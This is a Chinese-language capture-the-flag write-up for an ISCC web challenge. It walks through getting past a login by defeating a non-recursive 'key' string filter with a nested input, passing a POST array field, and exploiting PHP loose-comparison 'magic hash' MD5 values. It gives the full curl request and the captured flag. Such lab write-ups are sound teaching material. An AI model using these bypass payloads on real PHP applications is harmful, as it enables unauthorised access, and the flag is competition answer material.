# ISCC "消失的密钥" Web Writeup

## 题目描述

实验室的防护系统似乎有些老旧，它对"Key"这个词异常敏感。如果你能证明你比它的过滤器更聪明，或许能看到隐藏在迷雾后的真相。

题目地址：`39.105.213.28:12601`

## 信息收集

访问题目地址，是一个终端风格的登录页面：

- **系统信息**: ST_OS v4.2.1-RELEASE (AMD64)
- **状态**: AUTH_STATUS: UNAUTHORIZED
- **功能**: 输入框 + Login 按钮，表单参数为 `step1`（GET 方法）

尝试提交任意文本，返回调试信息：

```
Resultant String: 'test'
Status: REJECTED
[AUTH] Authentication failed. Unexpected token format.
```

## 关键发现：Key 过滤器

测试发现系统会移除输入中的小写 `key` 字符串：

| 输入 | 输出（过滤后） |
|------|---------------|
| `test` | `test` |
| `key` | `''`（被移除） |
| `Key` | `Key`（大写 K 不受影响） |
| `adkeymin` | `admin`（移除 key 后拼接） |
| `kkeyey` | `key`（移除内部 key 后剩下 key） |

## 解题步骤

### Phase 1：绕过 Key 过滤器

过滤器会移除输入中的 `key`。由于认证需要提交值 `key`，但直接输入 `key` 会被滤空，因此使用自嵌套绕过：

```
step1=kkeyey  →  过滤移除内部"key"  →  "key"  →  Phase 1 通过
```

返回信息：
```
[AUTH] Phase 1 Success. Master Const: 1337
```

### Phase 2：POST 数据结构 a

系统提示需要 POST 数据：
```
[SYS] Error: POST data structure 'a' missing. Terminal locked.
```

在 POST 中传递 `a[key]=1337`（使用 Phase 1 返回的 Master Const: 1337）：

```
[SYS] Collision check pending. (Params 'a', 'b' required via GET.)
```

需要 GET 参数 `a` 和 `b` 进行哈希碰撞校验。

### Phase 3：PHP 哈希碰撞绕过

系统校验 `hash(a) == hash(b)`（PHP 弱比较）。

使用 PHP 魔法哈希（Magic Hash）绕过：

- `a=240610708` → `md5("240610708") = 0e462097431906509019562988736854`
- `b=QNKCDZO` → `md5("QNKCDZO") = 0e830400451993494058024219903391`

两个哈希值均以 `0e` 开头，PHP 弱比较 `0 == 0` 为 `true`，哈希碰撞通过。

## 完整请求

```bash
curl -X POST "http://39.105.213.28:12601/?step1=kkeyey&a=240610708&b=QNKCDZO" \
  -d "a[key]=1337"
```

返回结果：

```
[AUTH] Phase 1 Success. Master Const: 1337
[AUTH] Phase 2 Identity Confirmed. Hash protocol initiated.
CREDENTIAL_FOUND: ISCC{QN-tGwW0yZD4!1fQ?TXJ0b0)bUag8i}
```

## Flag

```
ISCC{QN-tGwW0yZD4!1fQ?TXJ0b0)bUag8i}
```

## 知识点总结

| 阶段 | 考点 | 说明 |
|------|------|------|
| Phase 1 | 字符串过滤绕过 | `str_replace("key", "")` 可通过嵌套绕过：`kkeyey` → `key` |
| Phase 2 | 多参数联合校验 | GET + POST 参数组合，数据结构校验 |
| Phase 3 | PHP 弱类型哈希碰撞 | `md5(a) == md5(b)` 利用 Magic Hash（`0e` 开头）绕过 |
